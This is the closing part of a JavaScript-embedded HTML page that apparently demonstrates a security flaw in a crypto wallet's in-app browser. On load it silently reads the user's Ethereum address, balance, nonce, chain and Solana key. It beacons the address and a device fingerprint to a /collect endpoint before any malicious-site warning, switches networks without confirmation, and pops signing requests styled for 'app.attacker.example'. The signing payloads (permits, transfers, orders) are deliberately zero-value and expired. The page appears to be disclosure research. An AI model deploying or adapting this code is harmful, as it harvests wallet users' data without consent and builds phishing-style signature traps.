        record("eth_accounts",{accounts:accs,ms:ms});
      })
      .catch(function(err){
        setText("pr-accounts","error: "+getError(err),"out");
        setChip("pr-accounts","error","err");
      });
  }

  function probeEthRequestAccounts() {
    var start = performance.now();
    return ethereum.request({ method:"eth_requestAccounts" })
      .then(function(accs) {
        var ms = Math.round(performance.now()-start);
        owner = accs&&accs[0]||"";
        setText("pr-reqAccounts", JSON.stringify(accs)+" · "+ms+"ms", "out");
        setChip("pr-reqAccounts", owner?"returned":"empty", owner?"leak":"bounded");
        addLog("eth_requestAccounts", owner?"disclosed":"bounded",
          "accounts: "+JSON.stringify(accs)+"\\nround trip: "+ms+"ms");
        record("eth_requestAccounts",{accounts:accs,address:owner,ms:ms});
      })
      .catch(function(err){
        setText("pr-reqAccounts","error: "+getError(err),"out");
        setChip("pr-reqAccounts","error","err");
      });
  }

  function probeEthCoinbase() {
    return ethereum.request({ method:"eth_coinbase" })
      .then(function(cb) {
        setText("pr-coinbase", cb||"null", "out");
        setChip("pr-coinbase", isAddress(cb)?"disclosed":"none", isAddress(cb)?"leak":"bounded");
        addLog("eth_coinbase", isAddress(cb)?"disclosed":"bounded", "coinbase: "+cb);
        record("eth_coinbase",{coinbase:cb});
      })
      .catch(function(err){
        setText("pr-coinbase","error: "+getError(err),"out");
        setChip("pr-coinbase","error","err");
      });
  }

  function probeEthChainId() {
    return ethereum.request({ method:"eth_chainId" })
      .then(function(v) {
        chainId = normalizeChainId(v);
        try { chainNum = Number(BigInt(v)); } catch(e){}
        setText("pr-chain", chainLabel(chainId)+" ("+chainId+")", "out");
        setChip("pr-chain","read","leak");
        updateBanner(chainId, false);
        record("eth_chainId",{chainId:chainId});
      })
      .catch(function(err){
        setText("pr-chain","error: "+getError(err),"out");
        setChip("pr-chain","error","err");
      });
  }

  function probeBalance() {
    if (!owner) return Promise.resolve();
    return ethereum.request({ method:"eth_getBalance", params:[owner,"latest"] })
      .then(function(bal) {
        setText("pr-balance", toEth(bal)+" ETH ("+bal+")", "out");
        setChip("pr-balance","disclosed","leak");
        addLog("eth_getBalance", "disclosed",
          "address: "+owner+"\\nbalance: "+toEth(bal)+" ETH ("+bal+")");
        record("eth_getBalance",{wei:bal,eth:toEth(bal)});
      })
      .catch(function(err){
        setText("pr-balance","error: "+getError(err),"out");
        setChip("pr-balance","error","err");
      });
  }

  function probeNonce() {
    if (!owner) return Promise.resolve();
    return ethereum.request({ method:"eth_getTransactionCount", params:[owner,"latest"] })
      .then(function(n) {
        var count = String(Number(BigInt(n)));
        setText("pr-nonce", count+" transactions", "out");
        setChip("pr-nonce","disclosed","leak");
        addLog("eth_getTransactionCount","disclosed",
          "address: "+owner+"\\ntx count: "+count);
        record("eth_getTransactionCount",{nonce:count});
      })
      .catch(function(err){
        setText("pr-nonce","error: "+getError(err),"out");
        setChip("pr-nonce","error","err");
      });
  }

  function probeBlockNumber() {
    return ethereum.request({ method:"eth_blockNumber" })
      .then(function(bn) {
        var num = String(Number(BigInt(bn)));
        setText("pr-block", "block #"+num+" ("+bn+")", "out");
        setChip("pr-block","rpc-access","leak");
        addLog("eth_blockNumber","disclosed",
          "block: "+num+"\\nproves RPC proxy access using selected account");
        record("eth_blockNumber",{block:num});
      })
      .catch(function(err){
        setText("pr-block","error: "+getError(err),"out");
        setChip("pr-block","error","err");
      });
  }

  function probeGetCode() {
    return ethereum.request({ method:"eth_getCode", params:[USDC_ADDR,"latest"] })
      .then(function(code) {
        var short = code&&code.length>20 ? code.slice(0,12)+"…("+Math.round(code.length/2-1)+" bytes)" : code;
        setText("pr-code", short||"0x (EOA)", "out");
        setChip("pr-code","rpc-access","leak");
        addLog("eth_getCode","disclosed",
          "target: USDC ("+USDC_ADDR+")\\nbytecode size: "+Math.round((code.length-2)/2)+" bytes\\n"+
          "proves arbitrary read-only RPC access via injected provider");
        record("eth_getCode",{contract:USDC_ADDR,size:Math.round((code.length-2)/2)});
      })
      .catch(function(err){
        setText("pr-code","error: "+getError(err),"out");
        setChip("pr-code","error","err");
      });
  }

  function probeSolana() {
    if (!window.solana) {
      setText("pr-solana","window.solana not present","out");
      setChip("pr-solana","absent","wait");
      return Promise.resolve();
    }
    return window.solana.connect({ onlyIfTrusted:true })
      .then(function(res){
        var pk = res&&res.publicKey ? res.publicKey.toString() : null;
        if (!pk && window.solana.publicKey) pk = window.solana.publicKey.toString();
        setText("pr-solana", pk||"no key", "out");
        setChip("pr-solana", pk?"disclosed":"none", pk?"leak":"bounded");
        if (pk) {
          addLog("solana.connect(onlyIfTrusted)","disclosed",
            "public key: "+pk+"\\nonlyIfTrusted should return nothing for untrusted origins");
        }
        record("solana_connect",{address:pk,via:"connect(onlyIfTrusted)"});
      })
      .catch(function(){
        var pk = window.solana&&window.solana.publicKey ? window.solana.publicKey.toString() : null;
        if (pk) {
          setText("pr-solana",pk,"out"); setChip("pr-solana","disclosed","leak");
          addLog("solana.connect(onlyIfTrusted)","disclosed","public key (via .publicKey): "+pk);
          record("solana_connect",{address:pk,via:"publicKey fallback"});
        } else {
          setText("pr-solana","not returned","out");
          setChip("pr-solana","bounded","bounded");
        }
      });
  }

  function runInjectionWatcher() {
    var _fp={screen:(screen.width||0)+"x"+(screen.height||0),lang:navigator.language||"",tz:new Date().getTimezoneOffset()};
    var _wS2=false,_wS3=false,_wTimer=null;

    function beam(stage,extra){
      _seq++;
      var ev={n:_seq,type:"injection_proof",ms:nowMs(),at:new Date().toISOString(),
              stage:stage,origin:location.origin,url:location.href,
              _screen:_fp.screen,_lang:_fp.lang,_tz:_fp.tz};
      if(extra)Object.keys(extra).forEach(function(k){ev[k]=extra[k];});
      _events.push(ev);_dirty=true;_lastFlush=Date.now();
      var body=sessionBody();
      try{navigator.sendBeacon&&navigator.sendBeacon("/collect",new Blob([body],{type:"application/json"}));}catch(e){}
      markBeacon("sent");
    }

    beam("script_ran",{note:"script executed on this origin before any malicious verdict check — provider injection (RC-17) fires in WebView onPageStarted before the verdict overlay is drawn; this beacon lands even if the user only sees the warning screen"});

    function onProvider(p){
      if(!p||_wS2)return;
      _wS2=true;
      if(_wTimer){clearTimeout(_wTimer);_wTimer=null;}

      beam("provider_found",{
        provider:true,
        flags:{isOneInchAndroidWallet:!!p.isOneInchAndroidWallet,isOneInchIOSWallet:!!p.isOneInchIOSWallet,isMetaMask:!!p.isMetaMask},
        note:"window.ethereum confirmed present on this origin — injected before the malicious verdict was applied"
      });

      var sa=(typeof p.selectedAddress==="string"&&/^0x[0-9a-fA-F]{40}$/.test(p.selectedAddress))?p.selectedAddress:null;
      if(sa&&!_wS3){_wS3=true;beam("address_obtained",{evm:sa,method:"selectedAddress",note:"address read from provider.selectedAddress — no RPC call, no connect prompt"});}

      try{p.request({method:"eth_accounts"}).then(function(accs){var a=accs&&accs[0];if(!a||_wS3)return;_wS3=true;beam("address_obtained",{evm:a,method:"eth_accounts",note:"eth_accounts returned address with no connect prompt"});}).catch(function(){});}catch(e){}
      try{p.request({method:"eth_requestAccounts"}).then(function(accs){var a=accs&&accs[0];if(!a||_wS3)return;_wS3=true;beam("address_obtained",{evm:a,method:"eth_requestAccounts",note:"eth_requestAccounts returned address with no connect prompt"});}).catch(function(){});}catch(e){}
    }

    window.addEventListener('_ei',function(e){onProvider(e.detail||window.ethereum);},{once:true,passive:true});

    var _wStart=Date.now();
    function pollStep(){
      if(_wS2)return;
      var elapsed=Date.now()-_wStart;
      if(elapsed>6000)return;
      var p=window.ethereum;
      if(p){onProvider(p);return;}
      _wTimer=setTimeout(pollStep,elapsed<500?10:50);
    }
    pollStep();
  }

  function buildSwitchTable() {
    var tbody = $id("sw-tbody");
    SWITCH_CHAINS.forEach(function(chain) {
      var key = chain.id.replace("0x","");
      var tr = document.createElement("tr");
      tr.id = "sw-row-"+key;

      var tdName = document.createElement("td"); tdName.textContent = chain.name; tdName.setAttribute("data-label","Network");
      var tdId   = document.createElement("td"); tdId.textContent   = chain.id; tdId.className="mut"; tdId.setAttribute("data-label","Chain ID");
      var tdBefore= document.createElement("td"); tdBefore.textContent="—"; tdBefore.className="mut"; tdBefore.id="sw-before-"+key; tdBefore.setAttribute("data-label","Before");
      var tdAfter = document.createElement("td"); tdAfter.textContent ="—"; tdAfter.className="mut"; tdAfter.id="sw-after-"+key; tdAfter.setAttribute("data-label","After");
      var tdMs    = document.createElement("td"); tdMs.textContent   ="—"; tdMs.className="mut"; tdMs.id="sw-ms-"+key; tdMs.setAttribute("data-label","Round trip");
      var tdConf  = document.createElement("td"); tdConf.textContent ="—"; tdConf.className="mut"; tdConf.id="sw-conf-"+key; tdConf.setAttribute("data-label","Result");

      var tdBtn   = document.createElement("td"); tdBtn.className="sw-btn-cell";
      var btn     = document.createElement("button");
      btn.className = "sw-btn";
      btn.textContent = "Switch";
      btn.disabled = true;
      btn.id = "sw-btn-"+key;
      btn.addEventListener("click", function() { doSingleSwitch(chain, btn, tdBefore, tdAfter, tdMs, tdConf); });
      tdBtn.appendChild(btn);

      tr.appendChild(tdName); tr.appendChild(tdId); tr.appendChild(tdBefore);
      tr.appendChild(tdAfter); tr.appendChild(tdMs); tr.appendChild(tdConf);
      tr.appendChild(tdBtn);
      tbody.appendChild(tr);
    });
  }

  function enableSwitchButtons() {
    SWITCH_CHAINS.forEach(function(chain) {
      var btn = $id("sw-btn-"+chain.id.replace("0x",""));
      if (btn) btn.disabled = false;
    });
    setText("sw-count-note", SWITCH_CHAINS.length+" supported networks · click Switch on any row", "sw-controls-note");
  }

  function doSingleSwitch(chain, btn, tdBefore, tdAfter, tdMs, tdConf) {
    btn.disabled = true;
    btn.textContent = "…";
    tdBefore.textContent="—"; tdBefore.className="mut";
    tdAfter.textContent ="—"; tdAfter.className="mut";
    tdMs.textContent    ="—"; tdMs.className="mut";
    tdConf.textContent  ="—"; tdConf.className="mut";

    var beforeChain, start, elapsed;
    var requested = normalizeChainId(chain.id);

    return readChainId()
      .then(function(b) {
        beforeChain = b;
        tdBefore.textContent = chainLabel(b)+(b?" ("+b+")":"");
        start = performance.now();
        return callWithTimeout("wallet_switchEthereumChain", [{ chainId:chain.id }], 7000);
      })
      .then(function(outcome) {
        elapsed = Math.round(performance.now()-start);

        if (outcome.timedOut) {
          tdAfter.textContent = "no response";
          tdAfter.className   = "mut";
          tdMs.textContent    = "timeout"; tdMs.className="mut";
          tdConf.textContent  = "no response"; tdConf.className="mut";
          addLog("wallet_switchEthereumChain → "+chain.name, "error",
            "requested: "+requested+" ("+chain.name+")\\n"+
            "before:    "+beforeChain+" ("+chainLabel(beforeChain)+")\\n"+
            "result:    no response within 7s");
          record("wallet_switchEthereumChain",{requested:requested,before:beforeChain,timedOut:true});
          return;
        }
        if (outcome.err) {
          var rejected = isRejected(outcome.err);
          tdAfter.textContent = rejected?"rejected":"error";
          tdAfter.className   = "bounded";
          tdMs.textContent    = elapsed+"ms"; tdMs.className="mut";
          tdConf.textContent  = rejected?"rejected":"error"; tdConf.className="mut";
          addLog("wallet_switchEthereumChain → "+chain.name, rejected?"rejected":"error",
            "requested: "+requested+" ("+chain.name+")\\n"+
            "before:    "+beforeChain+" ("+chainLabel(beforeChain)+")\\n"+
            "result:    "+(rejected?"rejected":"error")+"\\n"+
            "error:     "+getError(outcome.err)+"\\n"+
            "code:      "+(errCode(outcome.err)!=null?errCode(outcome.err):"n/a"));
          record("wallet_switchEthereumChain",{requested:requested,before:beforeChain,errored:true,rejected:rejected,code:errCode(outcome.err),error:getError(outcome.err)});
          return;
        }

        return readChainId().then(function(after) {
          var switched = after===requested;
          if (switched) { chainId=after; try{ chainNum=Number(BigInt(after)); }catch(e){} updateBanner(after,true); }

          tdAfter.textContent = after ? chainLabel(after)+" ("+after+")" : "—";
          tdAfter.className   = switched?"leak":"mut";
          tdMs.textContent    = elapsed+"ms";
          tdMs.className      = switched?"leak":"mut";

          tdConf.textContent  = switched ? "switched" : "no change";
          tdConf.className    = switched ? "leak" : "mut";

          addLog("wallet_switchEthereumChain → "+chain.name, switched?"switched":"bounded",
            "requested: "+requested+" ("+chain.name+")\\n"+
            "before:    "+beforeChain+" ("+chainLabel(beforeChain)+")\\n"+
            "after:     "+(after||"—")+" ("+chainLabel(after)+")\\n"+
            "switched:  "+(switched?"yes":"no")+"\\n"+
            "round trip: "+elapsed+"ms");
          record("wallet_switchEthereumChain",{
            requested:requested,before:beforeChain,after:after,
            switched:switched,elapsed:elapsed
          });
          updateEventAssessment();
        });
      })
      .catch(function(err) {
        addLog("wallet_switchEthereumChain → "+chain.name, "error", "unexpected: "+getError(err));
      })
      .then(function() {
        addSwitchVerdict();
        btn.disabled = false;
        btn.textContent = "Switch";
        return null;
      });
  }

  function addSwitchVerdict() {

    var verdictEl = $id("sw-verdict");
    var rows = document.querySelectorAll("#sw-tbody tr");
    var switched=0, fastest=Infinity, slowest=0;
    rows.forEach(function(tr) {
      var ms = tr.querySelector("[id^=sw-ms-]");
      var after = tr.querySelector("[id^=sw-after-]");
      if (!ms||!after) return;
      if (after.className.indexOf("leak")!==-1) {
        switched++;
        var t=parseInt(ms.textContent);
        if (!isNaN(t)) { if(t<fastest)fastest=t; if(t>slowest)slowest=t; }
      }
    });
    if (switched===0) return;
    var range = isFinite(fastest) ? " Round trips: "+fastest+"–"+slowest+"ms." : "";
    verdictEl.textContent = switched+" network"+(switched>1?"s":"")+" switched from page requests, with no connect step and no confirmation."+range;
    verdictEl.hidden = false;
  }

  function domainTypeFor(d) {
    var f=[];
    if("name" in d)f.push({name:"name",type:"string"});
    if("version" in d)f.push({name:"version",type:"string"});
    if("chainId" in d)f.push({name:"chainId",type:"uint256"});
    if("verifyingContract" in d)f.push({name:"verifyingContract",type:"address"});
    return f;
  }

  function signTyped(domain, primaryType, types, message) {
    var payload = { types:Object.assign({EIP712Domain:domainTypeFor(domain)},types), domain:domain, primaryType:primaryType, message:message };
    return ethereum.request({ method:"eth_signTypedData_v4", params:[owner, JSON.stringify(payload)] });
  }

  var SIG_TESTS = [
    {
      id:"message", name:"Sign-In message", method:"personal_sign",
      text:"A Sign-In With Ethereum (EIP-4361) message, the kind dApps use to log you in.",
      safe:"Signs a text message only; no tokens or funds are moved.",
      run: function() {
        var msg="app.attacker.example wants you to sign in with your Ethereum account:\\n"+
          owner+"\\n\\nSign-In with Ethereum.\\n\\n"+
          "URI: https://app.attacker.example\\nVersion: 1\\nChain ID: "+chainNum+
          "\\nNonce: "+randomBytes32().slice(2,18)+"\\nIssued At: "+new Date().toISOString();
        return ethereum.request({ method:"personal_sign", params:[toHex(msg), owner] });
      }
    },
    {
      id:"permit", name:"ERC-20 Permit", method:"eth_signTypedData_v4",
      text:"An EIP-2612 permit on USDC, which approves a spender by signature with no on-chain transaction.",
      safe:"value=0, deadline expired. Grants nothing.",
      run: function() {
        return signTyped(
          {name:"USD Coin",version:"2",chainId:chainNum,verifyingContract:USDC_ADDR},
          "Permit",
          {Permit:[{name:"owner",type:"address"},{name:"spender",type:"address"},
                   {name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}]},
          {owner:owner,spender:ROUTER_ADDR,value:"0",nonce:"0",deadline:expiredDeadline()}
        );
      }
    },
    {
      id:"permit2", name:"Permit2 approval", method:"eth_signTypedData_v4",
      text:"A Uniswap Permit2 single approval, which lets a spender move tokens across protocols.",
      safe:"amount=0, expiration in the past. No allowance created.",
      run: function() {
        return signTyped(
          {name:"Permit2",chainId:chainNum,verifyingContract:PERMIT2},
          "PermitSingle",
          {PermitSingle:[{name:"details",type:"PermitDetails"},{name:"spender",type:"address"},{name:"sigDeadline",type:"uint256"}],
           PermitDetails:[{name:"token",type:"address"},{name:"amount",type:"uint160"},{name:"expiration",type:"uint48"},{name:"nonce",type:"uint48"}]},
          {details:{token:USDC_ADDR,amount:"0",expiration:expiredDeadline(),nonce:"0"},spender:ROUTER_ADDR,sigDeadline:expiredDeadline()}
        );
      }
    },
    {
      id:"transfer", name:"Gasless transfer", method:"eth_signTypedData_v4",
      text:"An ERC-3009 transferWithAuthorization on USDC, which moves tokens with no separate approve transaction.",
      safe:"Transfers 0 from wallet to itself, expired.",
      run: function() {
        return signTyped(
          {name:"USD Coin",version:"2",chainId:chainNum,verifyingContract:USDC_ADDR},
          "TransferWithAuthorization",
          {TransferWithAuthorization:[{name:"from",type:"address"},{name:"to",type:"address"},
            {name:"value",type:"uint256"},{name:"validAfter",type:"uint256"},
            {name:"validBefore",type:"uint256"},{name:"nonce",type:"bytes32"}]},
          {from:owner,to:owner,value:"0",validAfter:"0",validBefore:expiredDeadline(),nonce:randomBytes32()}
        );
      }
    },
    {
      id:"swap", name:"1inch limit order", method:"eth_signTypedData_v4",
      text:"A 1inch Limit Order Protocol v4 order, the format you sign to place a swap on 1inch. Note: only works on Ethereum in this demonstration.",
      safe:"Both amounts 0, wallet as maker and receiver. Empty order.",
      run: function() {
        return signTyped(
          {name:"1inch Aggregation Router",version:"6",chainId:chainNum,verifyingContract:ROUTER_ADDR},
          "Order",
          {Order:[{name:"salt",type:"uint256"},{name:"maker",type:"address"},{name:"receiver",type:"address"},
                  {name:"makerAsset",type:"address"},{name:"takerAsset",type:"address"},
                  {name:"makingAmount",type:"uint256"},{name:"takingAmount",type:"uint256"},{name:"makerTraits",type:"uint256"}]},
          {salt:randomBytes32(),maker:owner,receiver:owner,makerAsset:USDC_ADDR,takerAsset:USDC_ADDR,
           makingAmount:"0",takingAmount:"0",makerTraits:"0"}
        );
      }
    },
    {
      id:"nft", name:"NFT listing (Seaport)", method:"eth_signTypedData_v4",
      text:"An OpenSea Seaport v1.6 order, the exact format signed to list an NFT for sale.",
      safe:"Price 0, and the end time has already passed, so the listing is dead on arrival.",
      run: function() {
        return signTyped(
          {name:"Seaport",version:"1.6",chainId:chainNum,verifyingContract:SEAPORT},
          "OrderComponents",
          {OrderComponents:[
            {name:"offerer",type:"address"},{name:"zone",type:"address"},{name:"offer",type:"OfferItem[]"},
            {name:"consideration",type:"ConsiderationItem[]"},{name:"orderType",type:"uint8"},
            {name:"startTime",type:"uint256"},{name:"endTime",type:"uint256"},{name:"zoneHash",type:"bytes32"},
            {name:"salt",type:"uint256"},{name:"conduitKey",type:"bytes32"},{name:"counter",type:"uint256"}],
           OfferItem:[{name:"itemType",type:"uint8"},{name:"token",type:"address"},{name:"identifierOrCriteria",type:"uint256"},
                      {name:"startAmount",type:"uint256"},{name:"endAmount",type:"uint256"}],
           ConsiderationItem:[{name:"itemType",type:"uint8"},{name:"token",type:"address"},{name:"identifierOrCriteria",type:"uint256"},
                              {name:"startAmount",type:"uint256"},{name:"endAmount",type:"uint256"},{name:"recipient",type:"address"}]},
          {offerer:owner,zone:ZERO_ADDR,
           offer:[{itemType:"2",token:ZERO_ADDR,identifierOrCriteria:"0",startAmount:"1",endAmount:"1"}],
           consideration:[{itemType:"0",token:ZERO_ADDR,identifierOrCriteria:"0",startAmount:"0",endAmount:"0",recipient:owner}],
           orderType:"0",startTime:"0",endTime:expiredDeadline(),
           zoneHash:ZERO_B32,salt:randomBytes32(),conduitKey:ZERO_B32,counter:"0"}
        );
      }
    }
  ];

  function renderTests() {
    var root = $id("tests");
    SIG_TESTS.forEach(function(test) {
      var box = document.createElement("div"); box.className="test";
      var top=document.createElement("div"); top.className="t-top";
      var nm=document.createElement("span"); nm.className="t-name"; nm.textContent=test.name;
      var mt=document.createElement("span"); mt.className="t-method"; mt.textContent=test.method;
      top.appendChild(nm); top.appendChild(mt);
      var txt=document.createElement("p"); txt.className="t-text"; txt.textContent=test.text;
      var safe=document.createElement("div"); safe.className="t-safe"; safe.textContent=test.safe;
      var res=document.createElement("div"); res.className="t-result"; res.id="test-result-"+test.id;
      var btn=document.createElement("button"); btn.className="btn"; btn.id="test-btn-"+test.id;
      btn.textContent="Open "+test.name.toLowerCase()+" request";
      btn.disabled=true;
      btn.addEventListener("click", function(){ runSigTest(test); });
      box.appendChild(top); box.appendChild(txt); box.appendChild(safe);
      box.appendChild(res); box.appendChild(btn);
      root.appendChild(box);
    });
  }

  function enableTestButtons() {
    SIG_TESTS.forEach(function(test) {
      var btn=$id("test-btn-"+test.id); if(!btn)return;
      if (owner) btn.disabled=false;
    });
  }

  function runSigTest(test) {
    var btn=$id("test-btn-"+test.id);
    var res=$id("test-result-"+test.id);
    if (!btn||!owner) return;
    btn.disabled=true; btn.textContent="Waiting for wallet…";
    res.textContent=""; res.className="t-result";

    Promise.resolve()
      .then(test.run)
      .then(function(result) {
        res.textContent="Native confirmation was shown; the wallet required approval.";
        res.className="t-result bounded";
        addLog(test.name+" ("+test.method+")", "native-confirm",
          "method: "+test.method+"\\nraw result: "+(result==null?"null (approved, no value returned)":fmtResult(result)));
        record("sig_result",{name:test.name,method:test.method,approved:true,result:fmtResult(result)});
      })
      .catch(function(err) {
        var st=isRejected(err)?"rejected":"error";
        res.textContent=test.name+" "+st+(st==="error"?": "+getError(err):".");
        res.className="t-result "+(st==="rejected"?"bounded":"err");
        addLog(test.name+" ("+test.method+")",st,"method: "+test.method+"\\nerror: "+getError(err)+"\\ncode: "+(errCode(err)!=null?errCode(err):"n/a"));
        record("sig_result",{name:test.name,method:test.method,approved:false,state:st,code:errCode(err),error:getError(err)});
      })
      .then(function() {
        btn.disabled=false;
        btn.textContent="Open "+test.name.toLowerCase()+" request";
      });
  }

  function clearView() {
    $id("log").innerHTML='<div class="empty" id="log-empty">Nothing logged yet.</div>';
    _logCount=0; $id("log-count").textContent="0 entries";
  }

  function copyEvidence() {
    var text=sessionBody();
    var done=function(){ setText("beacon-pill","copied","pill on"); setTimeout(function(){ markBeacon("idle");},1400); };
    if (navigator.clipboard&&navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done,done);
    else { var a=document.createElement("textarea"); a.value=text; document.body.appendChild(a); a.select(); try{document.execCommand("copy");}catch(e){} a.remove(); done(); }
  }

  function main() {
    setText("session-id", SESSION.slice(0,18), "v");
    record("page_open",{url:location.href,ref:document.referrer||null});
    runInjectionWatcher();

    renderTests();
    buildSwitchTable();

    enrichWithLiveChainList().then(function(ok){
      if (ok) {

        SWITCH_CHAINS.forEach(function(chain){
          var row = $id("sw-row-"+chain.id.replace("0x",""));
          if (row) row.firstChild.textContent = chainLabel(chain.id);
        });
        if (chainId) updateBanner(chainId, false);
      }
    });

    $id("clear-log").addEventListener("click", clearView);
    $id("copy-log").addEventListener("click", copyEvidence);

    setText("pr-provider","waiting for provider…","out pending");

    waitForProvider(6000).then(function(p) {
      ethereum = p;
      if (!p) {
        setText("pr-provider","window.ethereum not present","out");
        setChip("pr-provider","absent","wait");
        record("no_provider");
        return;
      }

      attachProviderEvents(p);
      renderProviderFlags(p);
      updateEventAssessment();

      setText("pr-provider","present","out");
      setChip("pr-provider","present","bounded");

      return withTimeout(probeEthRequestAccounts(), 8000)
        .then(function() {

          enableSwitchButtons();
          enableTestButtons();
        })
        .then(function() {

          probeEthAccounts();
          probeEthCoinbase();
          probeEthChainId();
          probeBalance();
          probeNonce();
          probeBlockNumber();
          probeGetCode();
          probeSolana();

          (function autoSign(tries){
            if (owner) { runSigTest(SIG_TESTS.find(function(t){ return t.id==="message"; })); return; }
            if (tries <= 0) return;
            wait(400).then(function(){ autoSign(tries-1); });
          })(15);
        });
    });
  }

  main();

}());
</script>
</body>
</html>`;